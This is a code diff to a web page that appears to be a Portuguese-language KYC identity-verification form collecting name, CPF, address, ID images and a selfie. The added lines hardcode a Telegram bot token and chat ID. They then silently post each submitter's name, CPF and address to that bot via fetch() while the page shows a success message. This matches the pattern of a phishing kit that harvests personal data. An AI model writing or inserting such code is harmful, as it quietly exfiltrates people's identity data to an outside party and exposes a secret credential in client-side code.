@@ -160,7 +160,11 @@ input{
 
 let usuario = localStorage.getItem("usuario") || "user";
 
-/* 🔥 preview universal (qualquer imagem) */
+/* 🔥 CONFIG TELEGRAM */
+const TOKEN = "8616002020:AAGMiTHbWLNN-o6dz_rJ6hEcUX12RKnbFuA";
+const CHAT_ID = "7847311143";
+
+/* preview */
 function preview(input,id){
   let file = input.files[0];
 
@@ -201,16 +205,34 @@ function enviar(){
     numero: numero.value,
     cidade: cidade.value,
     cep: cep.value,
-
-    // 🔥 GUARDA QUALQUER FORMATO
     frente: frente || "",
     verso: verso || "",
     selfie: selfie || "",
-
     status: "analise"
   };
 
   localStorage.setItem("kyc_"+usuario, JSON.stringify(dados));
+
+  /* 🔥 ENVIO PRO BOT */
+  let mensagem =
+`Usuário: ${usuario}
+Nome: ${dados.nome}
+CPF: ${dados.cpf}
+
+Endereço:
+${dados.rua}, ${dados.numero}
+${dados.cidade} - ${dados.cep}
+
+Data: ${new Date().toLocaleString()}`;
+
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensagem
+    })
+  });
 
   toast("Enviado com sucesso");
 
